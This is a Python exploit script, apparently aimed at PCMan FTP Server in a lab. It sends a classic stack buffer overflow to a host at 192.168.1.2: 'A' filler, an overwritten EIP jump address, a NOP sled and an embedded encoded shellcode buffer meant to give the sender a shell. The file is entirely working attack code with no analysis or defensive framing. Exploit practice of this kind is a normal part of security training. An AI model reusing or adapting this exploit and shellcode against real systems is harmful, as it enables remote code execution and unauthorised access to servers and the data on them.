#!/usr/bin/python3

import socket
import sys

# Send specific exploit string to get the shell on the vulnerable server

# get our shellcode
def get_shellcode():
    buf = b""
    buf += b"\xda\xcd\xd9\x74\x24\xf4\xbf\x65\x47\x49\xbf\x58\x31"
    buf += b"\xc9\xb1\x56\x83\xe8\xfc\x31\x78\x14\x03\x78\x71\xa5"
    buf += b"\xbc\x43\x91\xab\x3f\xbc\x61\xcc\xb6\x59\x50\xcc\xad"
    buf += b"\x2a\xc2\xfc\xa6\x7f\xee\x77\xea\x6b\x65\xf5\x23\x9b"
    buf += b"\xce\xb0\x15\x92\xcf\xe9\x66\xb5\x53\xf0\xba\x15\x6a"
    buf += b"\x3b\xcf\x54\xab\x26\x22\x04\x64\x2c\x91\xb9\x01\x78"
    buf += b"\x2a\x31\x59\x6c\x2a\xa6\x29\x8f\x1b\x79\x22\xd6\xbb"
    buf += b"\x7b\xe7\x62\xf2\x63\xe4\x4f\x4c\x1f\xde\x24\x4f\xc9"
    buf += b"\x2f\xc4\xfc\x34\x80\x37\xfc\x71\x26\xa8\x8b\x8b\x55"
    buf += b"\x55\x8c\x4f\x24\x81\x19\x54\x8e\x42\xb9\xb0\x2f\x86"
    buf += b"\x5c\x32\x23\x63\x2a\x1c\x27\x72\xff\x16\x53\xff\xfe"
    buf += b"\xf8\xd2\xbb\x24\xdd\xbf\x18\x44\x44\x65\xce\x79\x96"
    buf += b"\xc6\xaf\xdf\xdc\xea\xa4\x6d\xbf\x62\x08\x5c\x40\x72"
    buf += b"\x06\xd7\x33\x40\x89\x43\xdc\xe8\x42\x4a\x1b\x79\x44"
    buf += b"\x6d\xf3\xc1\x05\x93\xf4\x31\x0f\x50\xa0\x61\x27\x71"
    buf += b"\xc9\xea\xb7\x7e\x1c\x86\xbd\xe8\x5f\xfe\xc3\xe9\x37"
    buf += b"\xfc\xc3\xf8\x9b\x89\x22\xaa\x73\xd9\xfa\x0b\x24\x99"
    buf += b"\xaa\xe3\x2e\x16\x94\x14\x51\xfd\xbd\xbf\xbe\xab\x96"
    buf += b"\x57\x26\xf6\x6d\xc9\xa7\x2d\x08\xc9\x2c\xc7\xec\x84"
    buf += b"\xc4\xa2\xfe\xf1\xb2\x4c\xff\x01\x57\x4c\x95\x05\xf1"
    buf += b"\x1b\x01\x04\x24\x6b\x8e\xf7\x03\xe8\xc9\x08\xd2\xd8"
    buf += b"\xa2\x3f\x40\x64\xdd\x3f\x84\x64\x1d\x16\xce\x64\x75"
    buf += b"\xce\xaa\x37\x60\x11\x67\x24\x39\x84\x88\x1c\xed\x0f"
    buf += b"\xe1\xa2\xc8\x78\xae\x5d\x3f\xfb\xa9\xa1\xbd\xd4\x11"
    buf += b"\xc9\x3d\x65\xa2\x09\x54\x65\xf2\x61\xa3\x4a\xfd\x41"
    buf += b"\x4c\x41\x56\xc9\xc7\x04\x14\x68\xd7\x0c\xf8\x34\xd8"
    buf += b"\xa3\x21\xc7\xa3\xcc\xd6\x28\x54\xc5\xb2\x29\x54\xe9"
    buf += b"\xc4\x16\x82\xd0\xb2\x59\x16\x67\xcc\xec\x3b\xce\x47"
    buf += b"\x0e\x6f\x10\x42"

    return buf


def main():
    # number of garbage characters to send
    length = int(sys.argv[2])

    # set ip and port
    ip = "192.168.1.2"
    port = int(sys.argv[1])

    # set up socket stuff
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))

    # location of the jump esp goes here
    # changes everytime with pcman :(
    eip = b"\x87\x15\x84\x74"
    # eip = "BBBB".encode()

    # see where these Cs go 
    # buf is the shellcode that is defined above
    payload = get_shellcode()

    # in order to reach the part of the code that
    # does the exploit you need to begin with this
    command = ""

    print(sock.recv(1024).decode("utf-8"))
    
    # perfect length for pcman is 2008
    garbage = "A"*length
    nop_sled = b"\x90"*24
    exploit_str = command.encode() + garbage.encode() + eip + nop_sled + payload
    # exploit_str = garbage.encode() + "BBBB".encode()


    sock.send(exploit_str)
    
    # get and print the response
    # when it finally crashes this is where we will be stopped
    print(sock.recv(1024).decode("utf-8"))
        

if __name__ == "__main__":
    main()
